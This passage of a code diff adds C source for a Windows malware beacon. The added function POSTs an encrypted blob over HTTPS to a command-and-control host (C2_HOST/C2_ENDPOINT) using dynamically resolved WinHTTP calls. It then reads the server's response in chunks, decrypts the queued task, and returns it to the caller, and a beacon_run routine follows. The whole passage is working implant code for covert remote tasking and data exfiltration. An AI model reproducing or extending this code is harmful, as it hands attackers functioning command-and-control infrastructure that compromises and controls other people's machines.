+        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+      printf("[!] WinHttpOpenRequest Failed: %ld\n", GetLastError());
+      goto CLEANUP;
+    }
+
+    // ── Step 6: send encrypted blob as request body ──────────────
+    printf("[*] POSTing to %S%S\n", C2_HOST, C2_ENDPOINT);
+    if (!pWinHttpSendRequest(
+            hRequest, L"Content-Type: application/octet-stream\r\n", (DWORD)-1L,
+            pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
+      printf("[!] WinHttpSendRequest Failed: %ld\n", GetLastError());
+      goto CLEANUP;
+    }
+
+    // ── Step 7: receive response headers ─────────────────────────
+    if (!pWinHttpReceiveResponse(hRequest, NULL)) {
+      printf("[!] WinHttpReceiveResponse Failed: %ld\n", GetLastError());
+      goto CLEANUP;
+    }
+
+    // check HTTP status code
+    pWinHttpQueryHeaders(hRequest,
+                         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                         WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
+                         WINHTTP_NO_HEADER_INDEX);
+
+    printf("[*] C2 response status: %ld\n", statusCode);
+    if (statusCode != 200) {
+      printf("[!] Non-200 response — no task\n");
+      bSuccess = TRUE; // not an error, just no task
+      goto CLEANUP;
+    }
+
+    // ── Step 8: read response body in chunks ─────────────────────
+    do {
+      dwBytesRead = 0;
+      ZeroMemory(chunk, READ_CHUNK_SIZE);
+
+      if (!pWinHttpReadData(hRequest, chunk, READ_CHUNK_SIZE, &dwBytesRead))
+        break;
+      if (dwBytesRead == 0)
+        break;
+
+      // grow response buffer
+      BYTE *pTemp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pResponse,
+                                        dwRespTotal + dwBytesRead);
+      if (!pTemp) {
+        printf("[!] HeapReAlloc Failed\n");
+        goto CLEANUP;
+      }
+      pResponse = pTemp;
+      memcpy(pResponse + dwRespTotal, chunk, dwBytesRead);
+      dwRespTotal += dwBytesRead;
+
+    } while (dwBytesRead == READ_CHUNK_SIZE);
+
+    printf("[+] Received %ld bytes from C2\n", dwRespTotal);
+
+    if (!pResponse || dwRespTotal == 0) {
+      bSuccess = TRUE; // 200 but empty body = no task queued
+      goto CLEANUP;
+    }
+
+    // ── Step 9: decrypt response ─────────────────────────────────
+    if (!aes_decrypt_payload(pResponse, dwRespTotal, &pDecrypted,
+                             &dwDecryptSize)) {
+      printf("[!] aes_decrypt_payload Failed\n");
+      goto CLEANUP;
+    }
+    printf("[+] Decrypted response: %ld bytes\n", dwDecryptSize);
+
+    // hand off to caller — caller owns this memory, must HeapFree it
+    *responseOut = (BYTE *)pDecrypted;
+    *responseLenOut = dwDecryptSize;
+    bSuccess = TRUE;
+
+  CLEANUP:
+    if (pEncrypted)
+      HeapFree(GetProcessHeap(), 0, pEncrypted);
+    if (pResponse)
+      HeapFree(GetProcessHeap(), 0, pResponse);
+    if (hRequest)
+      pWinHttpCloseHandle(hRequest);
+    if (hConnect)
+      pWinHttpCloseHandle(hConnect);
+    if (hSession)
+      pWinHttpCloseHandle(hSession);
+    return bSuccess;
 }
 
 VOID beacon_run() {
